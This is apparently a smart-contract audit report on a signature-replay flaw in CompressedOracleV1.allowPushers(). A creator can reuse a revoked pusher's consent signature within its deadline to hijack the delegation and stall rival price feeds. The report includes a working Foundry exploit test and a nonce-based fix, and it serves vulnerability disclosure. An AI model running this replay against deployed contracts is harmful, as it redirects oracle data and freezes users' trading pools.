### Title
Pusher consent signature can be replayed within deadline window to re-establish a revoked delegation, redirecting feed writes and starving the pusher's intended namespace — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers()` accepts a pusher's EIP-191 consent signature and unconditionally writes `namespaceRemapping[pusher] = msg.sender`. The signature commits to `(chainid, oracle, deadline, pusher, creator)` but there is no nonce and no used-signature tracking. The deadline is the only replay gate. After a pusher calls `revokePusher()`, the creator can replay the original consent signature — as many times as desired, for as long as `block.timestamp <= deadline` — to silently re-establish the delegation the pusher explicitly terminated.

---

### Finding Description

`allowPushers` is the EOA-pusher delegation path:

```solidity
function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));
    namespaceRemapping[pusher] = msg.sender;   // ← unconditional write
    emit PusherAuthorized(pusher, msg.sender);
}
``` [1](#0-0) 

`revokePusher` clears the mapping:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [2](#0-1) 

The code's own NatSpec acknowledges the risk: *"an undated signature could re-establish a delegation AFTER the pusher revoked it"* — but the deadline only bounds the window; it does not prevent unlimited replays within that window. There is no nonce, no per-signature consumed-flag, and no check that `namespaceRemapping[pusher]` is currently zero before writing. [3](#0-2) 

`_ensureDeadline` performs only a timestamp comparison — no state is mutated:

```solidity
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
``` [4](#0-3) 

The `fallback()` push path reads `namespaceRemapping[msg.sender]` at push time, so whichever namespace is live at the moment of the push determines where the slot word lands:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

---

### Impact Explanation

**Attack sequence:**

1. Pusher P signs consent for creator C1 with `deadline = T + N days`.
2. C1 calls `allowPushers(deadline, [P], [sig])` → `namespaceRemapping[P] = C1`.
3. P decides to push for creator C2 instead; calls `revokePusher()` → `namespaceRemapping[P] = address(0)`.
4. P calls `allowPushers` for C2 (C2 calls it with P's new signature) → `namespaceRemapping[P] = C2`.
5. C1 replays the original signature: `allowPushers(deadline, [P], [old_sig])` → `namespaceRemapping[P] = C1` again (deadline still valid).
6. P's next push goes to C1's namespace, not C2's.
7. C2's feeds at `feedIdOf(C2, slotIndex, positionIndex)` are never updated → timestamp stays at the last value → after `MAX_REF_STALENESS` seconds, `AnchoredPriceProvider._readLeg()` returns `ok = false` → `getBidAndAskPrice()` reverts `FeedStalled` → C2's pools are bricked for swaps. [6](#0-5) 

C1 can repeat step 5 every time P revokes, making the revocation permanently ineffective for the lifetime of the deadline. Deadlines can be set arbitrarily far in the future (the contract imposes no cap).

The `AnchoredPriceProvider` staleness check treats `refTime == 0` or `(nowTs - refTime) > maxDelta` as stale, so a feed that stops receiving pushes will halt all swaps through any pool bound to it:

```solidity
if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);
``` [7](#0-6) 

```solidity
if (bid == 0 || ask == type(uint128).max) revert FeedStalled();
``` [8](#0-7) 

---

### Likelihood Explanation

The trigger requires:
1. A pusher who previously signed a consent with a future deadline (normal operational practice).
2. The pusher subsequently revokes.
3. The original creator replays the old signature.

Step 3 is a single on-chain call with a publicly available signature (it was submitted in a prior transaction). The creator has a direct economic incentive to keep the pusher feeding their namespace. The window is bounded only by the deadline, which can be days or weeks. This is a medium-likelihood scenario: it requires a motivated creator and a pusher who revokes, but both are realistic operational events.

---

### Recommendation

Track consumed signatures with a per-pusher revocation nonce or a `usedSignatures` mapping. The simplest fix is to add a per-pusher nonce that the pusher signs over, and increment it on every successful `allowPushers` or `revokePusher` call:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline,
                         pusher, msg.sender, pusherNonce[pusher]))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
pusherNonce[pusher]++;          // invalidates all prior signatures
namespaceRemapping[pusher] = msg.sender;

// In revokePusher:
pusherNonce[msg.sender]++;      // invalidates any outstanding consent signatures
namespaceRemapping[msg.sender] = address(0);
```

Alternatively, check that `namespaceRemapping[pusher]` is currently `address(0)` before writing, so `allowPushers` cannot overwrite an active (or freshly revoked) mapping without the pusher first being in the unset state — though this alone does not prevent replay after a revoke.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {CompressedOracleV1} from "../contracts/oracles/compressed/CompressedOracle.sol";
import {IOffchainOracle} from "../contracts/interfaces/IOffchainOracle.sol";
import {U64x32} from "../contracts/oracles/utils/U64x32.sol";

contract ReplayDelegationTest is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY = 0xBEEF;
    uint256 constant CREATOR1_KEY = 0xC1;
    uint256 constant CREATOR2_KEY = 0xC2;

    address pusher;
    address creator1;
    address creator2;

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher   = vm.addr(PUSHER_KEY);
        creator1 = vm.addr(CREATOR1_KEY);
        creator2 = vm.addr(CREATOR2_KEY);
        vm.warp(1_700_000_000);
    }

    function testRevokedDelegationReplayable() public {
        uint256 deadline = block.timestamp + 7 days;

        // 1. Pusher signs consent for creator1
        bytes32 digest1 = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator1))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest1);
        bytes memory sig1 = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig1;

        // 2. Creator1 establishes delegation
        vm.prank(creator1);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator1);

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // 4. Pusher delegates to creator2 (new consent)
        bytes32 digest2 = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator2))
        );
        (v, r, s) = vm.sign(PUSHER_KEY, digest2);
        sigs[0] = abi.encodePacked(r, s, v);
        vm.prank(creator2);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator2);

        // 5. Creator1 REPLAYS the old signature — deadline still valid
        sigs[0] = sig1;
        vm.prank(creator1);
        oracle.allowPushers(deadline, pushers, sigs);
        // Delegation is back to creator1 against pusher's will
        assertEq(oracle.namespaceRemapping(pusher), creator1);

        // 6. Pusher's next push lands in creator1's namespace, not creator2's
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw = (uint48(1_000_000) << 16) | (uint48(3) << 8) | uint48(3);
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(
            (uint256(tsMs) << 8) | uint256(0) | (uint256(raw) << 208)
        ));
        assertTrue(ok);

        // creator2's feed is never updated → stale → pools using it halt
        IOffchainOracle.OracleData memory c2data =
            oracle.getOracleData(oracle.feedIdOf(creator2, 0, 0));
        assertEq(c2data.price, 0, "creator2 feed starved");
    }
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-212)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L216-216)
```text
        if (bid == 0 || ask == type(uint128).max) revert FeedStalled();
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L277-294)
```text
    function _readLeg(bytes32 feedId)
        internal returns (uint256 mid, uint256 spreadBps, uint256 refTime, bool ok)
    {
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);

        // Basic validity — mid positive, spreadBps not the stalled/off-hours marker (the Chainlink oracle
        // writes spreadBps = ORACLE_BPS when an RWA market is closed).
        if (mid == 0 || spreadBps >= ORACLE_BPS) return (mid, spreadBps, refTime, false);

        // Per-leg price guard.
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(feedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) return (mid, spreadBps, refTime, false);

        ok = true;
```
